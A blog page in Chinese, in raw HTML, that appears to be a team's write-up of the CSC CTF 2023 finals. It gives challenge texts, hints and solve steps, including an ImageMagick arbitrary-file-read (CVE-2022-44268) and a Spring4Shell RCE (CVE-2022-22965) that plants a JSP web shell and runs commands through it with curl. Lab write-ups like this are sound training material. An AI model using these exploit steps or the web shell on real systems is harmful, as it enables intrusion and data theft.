<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="
  CSC CTF 2023 決賽
  #

隊伍名稱: 名字好難想RRRRRRRRRRRRRRR

  教學題
  #


  Q4
  #


  題目敘述
  #


成為「admin」並取得Flag
[連線IP/連結資訊]
http://192.168.100.71
[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}

  Exploit
  #

這一題太難了，看了教學檔案還是沒辦法在有效時間內解出來，所以放棄
學長自述:

  Q5
  #


  題目敘述
  #


壞壞恐怖組織要對這邊進行恐攻，丟了一顆定時炸彈，拆彈專家4你???拆彈成功領取豐沛的獎勵吧!
[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}

  Exploit
  #

測驗智商用的，直接pwntools就可以了
from pwn import *

r = process('./Bomb.exe')
r.recvuntil(b'P1ease count A(')
A = r.recvuntil(b')')[:-1].decode()
sign = r.recv(3).decode()
B = r.recvline()[2:-2].decode()

log.info(f'A({A}) {sign} B({B}) = {eval(A + sign + B)}')
r.sendlineafter(b'Enter your answer: ', str(eval(A + sign + B)).encode())

r.interactive()
$ python exp.py
[+] Starting local process './Bomb.exe': pid 8143
[*] A(1507886)  +  B(7372399) = 8880285
[*] Switching to interactive mode

Good job!\(^^)/
CSC{FLAG_54v3th3d4y7777777}Time's up! (っ•O•)╮ =͟͟͞͞●~*
[*] Got EOF while reading in interactive
Flag: CSC{FLAG_54v3th3d4y7777777}"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="CSC 2023 決賽"><meta property="og:description" content="CSC CTF 2023 決賽 # 隊伍名稱: 名字好難想RRRRRRRRRRRRRRR
教學題 # Q4 # 題目敘述 # 成為「admin」並取得Flag
[連線IP/連結資訊] http://192.168.100.71
[備註] 答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}
Exploit # 這一題太難了，看了教學檔案還是沒辦法在有效時間內解出來，所以放棄 學長自述:
Q5 # 題目敘述 # 壞壞恐怖組織要對這邊進行恐攻，丟了一顆定時炸彈，拆彈專家4你???拆彈成功領取豐沛的獎勵吧!
[備註] 答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}
Exploit # 測驗智商用的，直接pwntools就可以了
from pwn import * r = process('./Bomb.exe') r.recvuntil(b'P1ease count A(') A = r.recvuntil(b')')[:-1].decode() sign = r.recv(3).decode() B = r.recvline()[2:-2].decode() log.info(f'A({A}) {sign} B({B}) = {eval(A + sign + B)}') r.sendlineafter(b'Enter your answer: ', str(eval(A + sign + B)).encode()) r.interactive() $ python exp.py [+] Starting local process './Bomb.exe': pid 8143 [*] A(1507886) + B(7372399) = 8880285 [*] Switching to interactive mode Good job!\(^^)/ CSC{FLAG_54v3th3d4y7777777}Time's up! (っ•O•)╮ =͟͟͞͞●~* [*] Got EOF while reading in interactive Flag: CSC{FLAG_54v3th3d4y7777777}"><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="security"><meta property="article:tag" content="CTF"><meta property="article:tag" content="CSC"><title>CSC 2023 決賽 | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/security/competition/csc-2023-%E6%B1%BA%E8%B3%BD/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>CSC 2023 決賽</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#教學題>教學題</a><ul><li><a href=#q4>Q4</a></li><li><a href=#q5>Q5</a></li></ul></li><li><a href=#一般題>一般題</a><ul><li><a href=#q1>Q1</a></li><li><a href=#q2>Q2</a></li><li><a href=#q7>Q7</a></li><li><a href=#q8>Q8</a></li></ul></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=csc-ctf-2023-決賽>CSC CTF 2023 決賽
<a class=anchor href=#csc-ctf-2023-%e6%b1%ba%e8%b3%bd>#</a></h1><p>隊伍名稱: 名字好難想RRRRRRRRRRRRRRR</p><h2 id=教學題>教學題
<a class=anchor href=#%e6%95%99%e5%ad%b8%e9%a1%8c>#</a></h2><h3 id=q4>Q4
<a class=anchor href=#q4>#</a></h3><h4 id=題目敘述>題目敘述
<a class=anchor href=#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0>#</a></h4><blockquote><p>成為「admin」並取得Flag</p><p>[連線IP/連結資訊]
http://192.168.100.71</p><p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}</p></blockquote><h4 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h4><p>這一題太難了，看了教學檔案還是沒辦法在有效時間內解出來，所以放棄
學長自述:</p><h3 id=q5>Q5
<a class=anchor href=#q5>#</a></h3><h4 id=題目敘述-1>題目敘述
<a class=anchor href=#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0-1>#</a></h4><blockquote><p>壞壞恐怖組織要對這邊進行恐攻，丟了一顆定時炸彈，拆彈專家4你???拆彈成功領取豐沛的獎勵吧!</p><p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}</p></blockquote><h4 id=exploit-1>Exploit
<a class=anchor href=#exploit-1>#</a></h4><p>測驗智商用的，直接pwntools就可以了</p><pre tabindex=0><code class=language-python! data-lang=python!>from pwn import *

r = process(&#39;./Bomb.exe&#39;)
r.recvuntil(b&#39;P1ease count A(&#39;)
A = r.recvuntil(b&#39;)&#39;)[:-1].decode()
sign = r.recv(3).decode()
B = r.recvline()[2:-2].decode()

log.info(f&#39;A({A}) {sign} B({B}) = {eval(A + sign + B)}&#39;)
r.sendlineafter(b&#39;Enter your answer: &#39;, str(eval(A + sign + B)).encode())

r.interactive()
</code></pre><pre tabindex=0><code class=language-bash! data-lang=bash!>$ python exp.py
[+] Starting local process &#39;./Bomb.exe&#39;: pid 8143
[*] A(1507886)  +  B(7372399) = 8880285
[*] Switching to interactive mode

Good job!\(^^)/
CSC{FLAG_54v3th3d4y7777777}Time&#39;s up! (っ•O•)╮ =͟͟͞͞●~*
[*] Got EOF while reading in interactive
</code></pre><p>Flag: <code>CSC{FLAG_54v3th3d4y7777777}</code></p><h2 id=一般題>一般題
<a class=anchor href=#%e4%b8%80%e8%88%ac%e9%a1%8c>#</a></h2><h3 id=q1>Q1
<a class=anchor href=#q1>#</a></h3><h4 id=題目敘述-2>題目敘述
<a class=anchor href=#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0-2>#</a></h4><blockquote><p>Company ABC is known to produce services to provide Web3 protection. This company specializes in Zero-knowledge proofs (ZKPs) for distributed devices.</p><p>Company ABC provides two services:</p><ol><li>ABC_Prover (GetNewChallenge / Get LastValidChallenge), which gives a challenge, and</li><li>ABC_Verify (VerifyAnswers), which expects a true/false response.</li></ol><p>If the challenge is answered correctly, the ABC_Verify returns a string with the secret flag. If the answer is wrong, it returns an error message.
5 attempts are allowed per challenge. If the 5 attempts are wrong, the challenge changes for a new one.</p><p>Both ABC_Prover and ABC_Verify are public services provided by the Company ABC as part of their products.
You are a hacker who got access to the Example_Oracle (GetExamples) service, which was supposed to be used only for debugging inside the company.
Your task is, based on the examples you can get from the Example_Oracle service, to break the ABC_Verify service and get the secret flag.</p><p>[[IP Info./Website]]
http://192.168.100.95:50000/WebService1.asmx</p><p>[Notes]
Input CSC Flag Format: CSC{FLAG_with max 25 characters}</p></blockquote><h4 id=exploit-2>Exploit
<a class=anchor href=#exploit-2>#</a></h4><h3 id=q2>Q2
<a class=anchor href=#q2>#</a></h3><h4 id=題目敘述-3>題目敘述
<a class=anchor href=#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0-3>#</a></h4><blockquote><p>知識海洋學習無盡，從比賽中找到出口， Flag就藏在這未知的網站裡，嘗試潛入進去找到正確答案吧!</p><p>[連線IP/連結資訊]
192.168.100.79</p><p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}</p></blockquote><h4 id=hint>Hint
<a class=anchor href=#hint>#</a></h4><p>[提示一]
使用Nmap找到網站對外服務Port</p><p>[提示二]
找到登入介面/tournament/login</p><p>[提示三]
發現有開啟mysql服務，透過sql injection密碼是不是可以繞過</p><p>[提示四]
原始碼裡有特定Url，搭配Cookie的token key解開API</p><p>[提示五]
打開API後需要用什麼Decode</p><h4 id=exploit-3>Exploit
<a class=anchor href=#exploit-3>#</a></h4><ol><li>通靈登入介面</li><li>sqlmap直接打，有打出time based的部分，就卡住了</li><li>另外一組的jin也是卡在這邊</li></ol><h3 id=q7>Q7
<a class=anchor href=#q7>#</a></h3><h4 id=題目敘述-4>題目敘述
<a class=anchor href=#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0-4>#</a></h4><blockquote><p>透過情報收集，發現此網頁有上傳檔案服務的一個頁面，是一個免費的開源跨平台軟件套件，發現此版本可能有漏洞可利用。
此測試機存在一個上傳圖片的服務，且它存在著某個漏洞，讓你有機會可以進行攻擊，拿到內部存在的資料</p><p>[連線IP/連結資訊]
192.168.100.83</p><p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}</p></blockquote><h4 id=hint-1>Hint
<a class=anchor href=#hint-1>#</a></h4><p>[提示一]
網頁服務使用了什麼圖片編輯工具?檢視原始碼有重要訊息!</p><p>[提示二]
網頁弱點為ImageMagick 任意文件讀取</p><p>[提示三]
請上傳圖片得到必要訊息</p><p>[提示四]
下載上傳後的圖片分析內容</p><h4 id=exploit-4>Exploit
<a class=anchor href=#exploit-4>#</a></h4><ol><li>先掃port: nmap->8080</li><li>確認目前的開源工具為ImageMagick</li><li>搜尋一下ImageMagick的Vulnerability->CVE-2022-44268</li><li>用<a href=https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC>現成工具</a></li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ sudo apt-get install pngcrush exiftool exiv2 -y
</span></span><span style=display:flex><span>$ pngcrush -text a <span style=color:#e6db74>&#34;profile&#34;</span> <span style=color:#e6db74>&#34;/etc/hosts&#34;</span> abc.png
</span></span><span style=display:flex><span>$ exiv2 -pS pngout.png
</span></span></code></pre></div><p>上傳到系統，如果該檔案存在就會回傳一張圖片到前端供我們下載，之後就可以用exiftool分析</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ exiftool <span style=color:#66d9ef>return</span>.png
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>Raw Profile Type                : ..      13.6539323739343234366663300a.
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>$ python -c <span style=color:#e6db74>&#34;print(bytes.fromhex(&#39;6539323739343234366663300a&#39;).decode(&#39;utf-8&#39;))&#34;</span>
</span></span><span style=display:flex><span>e92794246fc0
</span></span></code></pre></div><p>目前不知道具體flag的位置和檔案名稱</p><p>賽後和asef以及ccccc有聊到這一題，發現居然是在前端的code有一串base64被hidden，裡面其實就是flag檔案的絕對位置，幹&mldr;真的通好久啊</p><h3 id=q8>Q8
<a class=anchor href=#q8>#</a></h3><h4 id=題目敘述-5>題目敘述
<a class=anchor href=#%e9%a1%8c%e7%9b%ae%e6%95%98%e8%bf%b0-5>#</a></h4><blockquote><p>你透過情報收集，聽聞某集團子公司有項服務上線使用的測試主機(192.168.100.88)因資訊人員便宜行事竟放在公開網路上。
此測試機(Spring Framework)的某項專案裡存在一個Web表單服務(/greeting)，它存在著某個漏洞，讓你有機會可以進行攻擊，你需要先找到正確的服務端口與頁面，並藉由這個程式的漏洞取得遠端主機的控制權限，進而取得公司內部資料(flag.txt)。</p><p>[連線IP/連結資訊]
192.168.100.88</p><p>[備註]
答題系統Flag輸入格式：CSC{FLAG_最多長度25可包含數字、英文大小寫、特殊字元及底線}</p></blockquote><h4 id=hint-2>Hint
<a class=anchor href=#hint-2>#</a></h4><p>[提示一]
使用Nmap與目錄掃描工具(http://192.168.100.88:???/???/greeting)</p><p>[提示二]
AccessLogValve</p><p>[提示三]
也許有公開的POC使用?</p><p>[提示四]
Webshell + URL Encode</p><p>[提示五]
找不到資料?使用linux指令find / -type f –name 來找看看吧</p><h4 id=exploit-5>Exploit
<a class=anchor href=#exploit-5>#</a></h4><ol><li>先用nmap掃Port -> 8888</li><li>dirsearch看sub folder -> hello<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ dirsearch -u <span style=color:#e6db74>&#34;http://192.168.100.88:8888&#34;</span>
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span><span style=color:#ae81ff>400</span>   795B   http://192.168.100.88:8888/<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\.</span>.<span style=color:#ae81ff>\e</span>tc<span style=color:#ae81ff>\p</span>asswd
</span></span><span style=display:flex><span><span style=color:#ae81ff>400</span>   795B   http://192.168.100.88:8888/a%5c.aspx
</span></span><span style=display:flex><span><span style=color:#ae81ff>302</span>     0B   http://192.168.100.88:8888/hello    -&gt; REDIRECTS TO: /hello/
</span></span><span style=display:flex><span>...
</span></span></code></pre></div></li><li>得知路徑為http://192.168.100.88:8888/hello/greeting</li><li>根據AccessLogValve得知漏洞應該為CVE-2022-22965</li><li>直接使用<a href=https://github.com/sunnyvale-it/CVE-2022-22965-PoC>現成工具</a>達到RCE<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ python exploit-core.py --url <span style=color:#e6db74>&#34;http://192.168.100.88:8888/hello/greeting&#34;</span> --file shell
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Resetting Log Variables.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response code: <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Modifying Log Configurations
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response code: <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response Code: <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Resetting Log Variables.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Response code: <span style=color:#ae81ff>200</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Exploit completed
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Check your target <span style=color:#66d9ef>for</span> a shell
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> File: shell.jsp
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Shell should be at: http://192.168.100.88:8888/shell.jsp?cmd<span style=color:#f92672>=</span>id
</span></span><span style=display:flex><span>$ curl http://192.168.100.88:8888/shell.jsp<span style=color:#ae81ff>\?</span>cmd<span style=color:#ae81ff>\=</span>find%20/%20-iname%20flag.txt --output -
</span></span><span style=display:flex><span>/usr/local/share/man/flag.txt
</span></span><span style=display:flex><span>$ curl http://192.168.100.88:8888/shell.jsp<span style=color:#ae81ff>\?</span>cmd<span style=color:#ae81ff>\=</span>cat%20/usr/local/share/man/flag.txt --output -
</span></span><span style=display:flex><span>CSC<span style=color:#f92672>{</span>FLAG_can_we_cut_to_the_chase?<span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>//
</span></span><span style=display:flex><span>- java.io.InputStream in <span style=color:#f92672>=</span> -.getRuntime<span style=color:#f92672>()</span>.exec<span style=color:#f92672>(</span>request.getParameter<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;cmd&#34;</span><span style=color:#f92672>))</span>.getInputStream<span style=color:#f92672>()</span>; int a <span style=color:#f92672>=</span> -1; byte<span style=color:#f92672>[]</span> b <span style=color:#f92672>=</span> new byte<span style=color:#f92672>[</span>2048<span style=color:#f92672>]</span>; <span style=color:#66d9ef>while</span><span style=color:#f92672>((</span>a<span style=color:#f92672>=</span>in.read<span style=color:#f92672>(</span>b<span style=color:#f92672>))</span>!<span style=color:#f92672>=</span>-1<span style=color:#f92672>){</span> out.println<span style=color:#f92672>(</span>new String<span style=color:#f92672>(</span>b<span style=color:#f92672>))</span>; <span style=color:#f92672>}</span> -
</span></span></code></pre></div>記得要注意URL encode
Flag: <code>CSC{FLAG_can_we_cut_to_the_chase?}1</code></li></ol></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#教學題>教學題</a><ul><li><a href=#q4>Q4</a></li><li><a href=#q5>Q5</a></li></ul></li><li><a href=#一般題>一般題</a><ul><li><a href=#q1>Q1</a></li><li><a href=#q2>Q2</a></li><li><a href=#q7>Q7</a></li><li><a href=#q8>Q8</a></li></ul></li></ul></nav></div></aside></main></body></html>